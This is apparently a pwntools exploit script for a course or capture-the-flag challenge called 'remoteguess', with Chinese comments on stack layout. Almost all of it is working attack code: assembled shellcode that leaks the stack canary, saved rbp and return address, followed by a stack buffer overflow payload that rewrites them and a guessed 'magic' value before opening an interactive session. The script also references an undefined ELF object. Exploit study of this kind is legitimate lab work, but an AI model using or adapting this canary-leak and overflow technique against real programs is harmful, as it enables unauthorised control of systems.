#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
import pwn
from pwn import *
import base64

context.arch = 'amd64'
context.os = 'linux'

# exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

# payload = None
# if os.path.exists(exe):
#     with open(exe, 'rb') as f:
#         payload = f.read()

payload = asm("""
section .text
global _start
_start:
    jmp msg
solver:
    push   rbp
    mov    rbp,rsp
    sub    rsp,0x20
    mov    rax,QWORD PTR fs:0x28
    mov    QWORD PTR [rbp-0x8],rax
    mov    QWORD PTR [rbp-0x10],0x41
    mov    r8, rdi
    lea    rax,[rbp-0x18]
    add    rax,0x20
    mov    rcx,QWORD PTR [rax]
    sub    rax,0x8
    mov    rdx,QWORD PTR [rax]
    sub    rax,0x8
    mov    rsi,QWORD PTR [rax]
    lea    rdi,0xa
    call   r8
    nop
    leave
    ret
msg:
    call solver
    db "canary: %llx\nrbp: %llx\nreturn_addr: %llx\n",0xa
""")
print(payload)


#r = remote("up23.zoolab.org", 10816)
r = process("./remoteguess", shell=True)  #test on local
#r = remote("localhost", 10816)
pwn.pause()  # for debugging (to see magic address)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    # ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver'])) #ef.symbols['solver']
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']))  #ef.symbols['solver']
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')


r.recvuntil(b'received.\n')
print("start recv from solver()")
q = r.recvuntil(b'\n').strip()
print("q = ", q)



r.recvuntil(b'canary: ')
canary = r.recvline().strip()
canary = int(canary, 16)
print("canary: ", hex(canary))

r.recvuntil(b'rbp: ')
rbp = r.recvline().strip()
rbp = int(rbp, 16)
print("rbp: ", hex(rbp))

r.recvuntil(b'return_addr: ')
return_addr = r.recvline().strip()
return_addr = int(return_addr, 16)+int("ab", 16)
print("return_addr: ", hex(return_addr))


r.recvuntil(b'Show me your answer? ')

myguess = 4
# remoteguess.c guess() char buf[16] 的起始位置在 canary位址-24bytes的地方
# magic 的起始位置在 return address位址 + 20bytes的地方 
# 以上為在local端用 gdb ./remoteguess 看的 (ex : printf "%p\n", &magic)
# 它會要求回答How many bytes of the solver...? 那些，先隨便敲要想辦法進到guess的function
buf = b''.join([str(myguess).encode('ascii').ljust(24, b'\0'), p64(canary), p64(rbp), p64(return_addr),b'\0'*12, p64(myguess)])
print("buf = ", buf)

r.send(buf)
r.interactive()
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :

# 補充: stack 是往 address low 的地方先allocate一個空間(buffer的話)，在往address高的地方寫資料 (可以看Evernote裡的照片)